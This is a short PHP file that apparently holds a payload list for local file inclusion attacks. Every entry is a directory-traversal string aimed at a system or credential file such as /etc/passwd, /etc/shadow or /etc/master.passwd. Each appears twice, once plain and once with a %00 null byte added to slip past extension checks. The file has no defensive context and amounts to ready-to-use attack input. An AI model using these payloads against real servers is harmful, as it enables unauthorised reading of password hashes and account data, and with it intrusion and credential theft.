<?php
$alfi = array ( );
$alfi [ ] = '../../../../../../../../etc/passwd';
$alfi [ ] = '../../../../../../../../etc/passwd%00';
$alfi [ ] = '../../../../../../../../etc/security/passwd';
$alfi [ ] = '../../../../../../../../etc/security/passwd%00';
$alfi [ ] = '../../../../../../../../etc/master.passwd';
$alfi [ ] = '../../../../../../../../etc/master.passwd%00';
$alfi [ ] = '../../../../../../../../.secure/etc/passwd';
$alfi [ ] = '../../../../../../../../.secure/etc/passwd%00';
$alfi [ ] = '../../../../../../../../etc/security/passwd.adjunct';
$alfi [ ] = '../../../../../../../../etc/security/passwd.adjunct%00';
$alfi [ ] = '../../../../../../../../etc/shadow';
$alfi [ ] = '../../../../../../../../etc/shadow%00';
$alfi [ ] = '../../../../../../../../etc/hosts';
$alfi [ ] = '../../../../../../../../etc/hosts%00';
?>

